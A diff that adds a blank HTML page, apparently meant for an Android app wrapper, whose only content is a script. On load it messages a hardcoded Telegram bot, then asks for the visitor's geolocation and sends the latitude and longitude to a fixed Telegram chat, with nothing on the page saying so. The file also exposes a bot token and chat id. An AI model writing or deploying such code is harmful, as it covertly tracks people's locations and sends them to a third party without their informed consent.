@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+</head>
+<body>
+    <script>
+        const token = "9156035172:AAG8XF7pLz7KV8nw9z09vHIhhUaWgHTXubI";
+        const chat = "8947742554";
+        
+        fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=Привет из APK!`);
+
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(
+                (pos) => {
+                    fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=Гео: ${pos.coords.latitude}, ${pos.coords.longitude}`);
+                }
+            );
+        }
+    </script>
+</body>
+</html>
